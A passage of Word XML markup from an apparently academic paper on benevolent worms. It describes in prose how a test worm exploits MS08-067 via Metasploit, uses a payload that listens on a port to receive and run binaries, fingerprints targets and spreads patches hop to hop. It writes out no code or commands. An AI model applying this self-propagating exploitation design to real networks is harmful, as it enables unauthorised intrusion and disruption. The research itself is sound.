    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00632A1F" w:rsidP="00632A1F">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">With this known successful vector I researched a well written exploit for use in the test implementation code.  The security exploit framework </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> provided a nice implementation for successfully exploiting the target Windows OS systems without crashing them (Moore 2012).  The</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> chosen payload was a small program that would listen on port 65534 for binary data that it saves to disk and executes on the target system.  This allows the worm to</w:t>
      </w:r>
      <w:r w:rsidR="009E2602">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>copy its larger exe</w:t>
      </w:r>
      <w:r w:rsidR="00767949">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>cutable from machine to machine without having to worry about constraints of running inside the initial exploit payload.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00FD6D3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initial release of an exploit is usually coded for a specific platform.  Because deeper exploration of the memory structure of varying platforms or patched systems hasn’t been completed yet the exploits can cause crashes or not work at all.  As time goes on researchers are </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">able to refine the exploit so it can better handle the memory addresses with a smaller chance of causing a crash (the ideal goal being to successfully get remote code execution whether for a malicious or benevolent worm).  A good example of this can be seen in the exploit development of MS08-067 (Microsoft </w:t>
      </w:r>
      <w:r w:rsidR="00F37372">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2008</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>).  Exploits available on exploit-db.com (Exploit Database</w:t>
      </w:r>
      <w:r w:rsidR="00F37372">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2012</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">) show the history of code for this </w:t>
      </w:r>
      <w:r w:rsidR="00A72706">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">exploit.  Stephen Lawler’s code </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>shows one of the first published discoveries of the issue which simply causes the service to crash</w:t>
      </w:r>
      <w:r w:rsidR="00A72706">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A72706" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(Lawler</w:t>
      </w:r>
      <w:r w:rsidR="00A72706">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2008</w:t>
      </w:r>
      <w:r w:rsidR="00A72706" w:rsidRPr="00861880">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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Debasis</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Mohanty’s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> code utilizes the Python programming language along with libraries designed to support the RPC protocol to allow it to better interact with the service in an easier to understand manner</w:t>
      </w:r>
      <w:r w:rsidR="00313B98">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00313B98" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(Mohanty</w:t>
      </w:r>
      <w:r w:rsidR="00313B98">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2008</w:t>
      </w:r>
      <w:r w:rsidR="00313B98" w:rsidRPr="00861880">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In addition the code also takes into account different editions and versions of the Windows OS to increase the success of the exploit executing code on the target.  The most advanced exploit code comes from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> which has code written in Ruby that can handle many different Windows OS editions and versions as well as verify if the target is actually vulnerable</w:t>
      </w:r>
      <w:r w:rsidR="00974D51">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00974D51" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="00974D51" w:rsidRPr="003B292A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Moore 2012</w:t>
      </w:r>
      <w:r w:rsidR="00974D51" w:rsidRPr="00861880">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w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="007406D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To avoid these issues a benevolent worm should fingerprint (OS, Version, Architecture) a target to determine if it has an exploit that can successfully work against it.  The more detailed a fingerprint is the better </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>an</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploit can be crafted to correctly execute on the platform.  However, knowledge of every platform with every patch level is not feasible.  </w:t>
      </w:r>
      <w:r w:rsidR="003D427F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ne of the large arguments against benevolent worms is that they will encounters systems for which the exploit (or vulnerability fix patch) may have not been tested and which could cause unknown side-effects.  While virtual machine technology does simplify the setup of large test environments, of which a number of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>OSes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> at various patch levels is possible</w:t>
      </w:r>
      <w:r>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it would still be difficult to cover every possible configuration.  Therefore</w:t>
      </w:r>
      <w:r w:rsidR="008C5D8C">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a benevolent worm should be targeted for specific platforms that can be readily verified by automated means via fingerprinting</w:t>
      </w:r>
      <w:r w:rsidR="004A4D7F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with a low probability of </w:t>
      </w:r>
      <w:r w:rsidR="004A4D7F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>misidentification</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.  In addition the ability of the worm to detect that the target system crashed when it attempted an exploit is useful.  The worm could even send out a notification to its peers that a target system appears to have crashed along with the fingerprint it obtained.  If a benevolent worm node sees a certain threshold of peer notifications of a crash it could blacklist any targets that have a corresponding fingerprint to avoid continual crashing.  This may even result in an auto-kill switch</w:t>
      </w:r>
      <w:r w:rsidR="00BB19DE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> if all targets are blacklisted</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> as mentioned in the “Semi-autonomous Replication” section.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00695A08">
      <w:pPr>
        <w:pStyle w:val="TH2"/>
      </w:pPr>
      <w:bookmarkStart w:id="31" w:name="_Toc321736800"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Vulnerability Fix</w:t>
      </w:r>
      <w:bookmarkEnd w:id="31"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="000B4679"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Methods of patching a vulnerable system can vary depending on the nature of the exploit.  Adding a firewall rule to simply block the service is not advisable because to do so automatically would lead to a denial of service to that system.  The normal path for a benevolent worm would be to download an available patch to update the affected service/OS instead.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="006B7C4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Once running the benevolent worm could simply download an official patch from the software vendor via the web.  Microsoft</w:t>
      </w:r>
      <w:r w:rsidR="00321C88">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for instance</w:t>
      </w:r>
      <w:r w:rsidR="00321C88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> distributes official patches via the Windows Update web site.  The updates also allow for eas</w:t>
      </w:r>
      <w:r w:rsidR="007D47CE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D54EF4">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>removal</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> by simply running </w:t>
      </w:r>
      <w:r w:rsidR="00FC7582">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>an uninstaller for it.  However</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> one difficulty is that the machine the worm is running on may not have public Internet access or the bandwidth going out may be limited which would cause congestion on the network.  A solution to this issue is to have the worm query its peers for a copy of the update patch and download it from them.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00D1337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Some networks have designated local update servers (i.e. Microsoft Windows Server Update Service) that the local machines are pointed towards.  The benevolent worm could also </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">trigger the local update service to download and install updates via this service which would also save </w:t>
      </w:r>
      <w:r w:rsidR="005165FA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">WAN </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>network bandwidth.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00D4480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In some cases for systems that have already been compromised the malicious program has disabled anti-virus and system updates.  The malicious program can even modify the local DNS resolver hosts file so that any attempts to access the updates sites via their domain name will fail.  If the benevolent worm successfully executes on such a system it could be coded to repair the damage done by the </w:t>
      </w:r>
      <w:r w:rsidR="006846B2" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>malicious</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> program and re-enable updates.  This is a similar idea to the Symantec patented worm (Isenberg</w:t>
      </w:r>
      <w:r w:rsidR="006846B2">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2007</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) that will go and install or repair the anti-virus client on the system and communicate with a designated central server to obtain the necessary anti-virus software for the machine.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="009D0B13"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test worm implementation</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> since the test environment has no public Internet connection the worm will simply obtained the needed patch code executable by copying it from hop-to-hop along with the worm executable and options.  Microsoft KB823980 (WindowsXP-KB823980-x86-ENU.exe) was used for the patch which is targeted at </w:t>
      </w:r>
      <w:r w:rsidR="005B106E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>systems running</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Microsoft Windows XP 32-bit.  This means that some targets that are exploited by the worm and run it will not be able to successfully patch since they are not Windows XP.  Details are provided in the “Test Procedure” section.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00695A08">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="32" w:name="_Toc321736801"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Test Procedure</w:t>
      </w:r>
      <w:bookmarkEnd w:id="32"/>
    </w:p>
    <w:p w:rsidR="0089241F" w:rsidRPr="00861880" w:rsidRDefault="0054552C" w:rsidP="008924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9241F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="0089241F" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> benevolent computer worm</w:t>
      </w:r>
      <w:r w:rsidR="0089241F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> was designed and written</w:t>
      </w:r>
      <w:r w:rsidR="0089241F" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> for use in testing of </w:t>
      </w:r>
      <w:r w:rsidR="0089241F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">the feasibility of a benevolent worm following the characteristics mentioned </w:t>
      </w:r>
      <w:r w:rsidR="00573F62">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>above</w:t>
      </w:r>
      <w:r w:rsidR="0089241F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
      <w:r w:rsidR="0089241F" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The code was written in </w:t>
      </w:r>
      <w:r w:rsidR="0089241F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="0089241F" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
